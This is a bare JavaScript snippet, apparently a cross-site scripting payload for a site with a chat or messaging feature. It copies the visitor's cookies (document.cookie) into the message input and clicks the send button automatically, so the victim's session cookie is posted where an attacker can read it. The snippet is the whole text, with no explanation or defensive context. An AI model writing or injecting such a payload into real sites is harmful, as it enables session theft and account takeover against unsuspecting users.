var messageInput = document.getElementById("message");
if (messageInput) 
    messageInput.value = document.cookie;
var sendMessageButton = document.querySelector(".input-group-addon.add-message");
if (sendMessageButton) {
    sendMessageButton.click();
}
